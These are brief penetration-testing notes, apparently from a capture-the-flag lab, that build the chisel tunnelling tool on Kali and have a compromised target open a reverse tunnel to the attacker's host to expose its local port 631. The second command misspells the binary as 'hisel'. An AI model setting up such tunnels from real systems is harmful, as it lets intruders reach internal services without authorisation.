#on kali  
git clone https://github.com/jpillora/chisel  
cd chisel && go build -ldflags="-s -w"  
sudo ./chisel server -p 8000 --reverse  
  
#on target  
./hisel client 10.10.14.2:8000 R:631:127.0.0.1:631